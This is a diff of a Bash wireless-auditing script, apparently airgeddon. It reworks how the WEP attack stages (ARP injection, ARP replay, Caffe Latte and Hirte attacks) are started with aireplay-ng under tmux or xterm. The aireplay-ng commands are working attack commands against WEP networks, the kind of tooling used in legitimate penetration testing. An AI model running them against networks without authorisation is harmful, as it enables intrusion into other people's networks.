@@ -3288,13 +3288,6 @@ function set_wep_script() {
 			get_tmux_process_id "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}"
 			wep_script_processes+=("\${global_process_pid}")
 			global_process_pid=""
-			# local arp_broadcast_injection_pid
-			# local arp_broadcast_injection_cmd_line
-			# arp_broadcast_injection_cmd_line=\$(echo "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" | tr -d '"')
-			# while [ -z "\${arp_broadcast_injection_pid}" ]; do
-				# arp_broadcast_injection_pid=\$(ps --no-headers aux | grep "\$arp_broadcast_injection_cmd_line" | grep -v "grep \$arp_broadcast_injection_cmd_line" | awk '{print \$2}')
-			# done
-			# wep_script_processes+=(\${arp_broadcast_injection_pid})
 		EOF
 	else
 		cat >&6 <<-EOF
@@ -3314,13 +3307,6 @@ function set_wep_script() {
 			get_tmux_process_id "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}"
 			wep_script_processes+=("\${global_process_pid}")
 			global_process_pid=""
-			# local arp_request_replay_pid
-			# local arp_request_replay_cmd_line
-			# arp_request_replay_cmd_line=\$(echo "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" | tr -d '"')
-			# while [ -z "\${arp_request_replay_pid}" ]; do
-				# arp_request_replay_pid=\$(ps --no-headers aux | grep "\$arp_request_replay_cmd_line" | grep -v "grep \$arp_request_replay_cmd_line" | awk '{print \$2}')
-			# done
-			# wep_script_processes+=(\${arp_request_replay_pid})
 		EOF
 	else
 		cat >&6 <<-EOF
@@ -3334,13 +3320,24 @@ function set_wep_script() {
 		EOF
 	fi
 
-	cat >&6 <<-EOF
-				xterm -hold -bg "#000000" -fg "#FFC0CB" -geometry "${g5_left4}" -T "Caffe Latte Attack" -e "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
-	EOF
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		cat >&6 <<-EOF
+			start_tmux_processes "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Caffe Latte Attack"
+			get_tmux_process_id "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}"
+			wep_script_processes+=("\${global_process_pid}")
+			global_process_pid=""
+		EOF
+	else
+		cat >&6 <<-EOF
+					xterm -hold -bg "#000000" -fg "#FFC0CB" -geometry "${g5_left4}" -T "Caffe Latte Attack" -e "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+		EOF
+	fi
 
-	cat >&6 <<-'EOF'
-				wep_script_processes+=($!)
-	EOF
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		cat >&6 <<-'EOF'
+					wep_script_processes+=($!)
+		EOF
+	fi
 
 	cat >&6 <<-EOF
 				xterm -hold -bg "#000000" -fg "#D3D3D3" -geometry "${g5_left5}" -T "Hirte Attack" -e "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
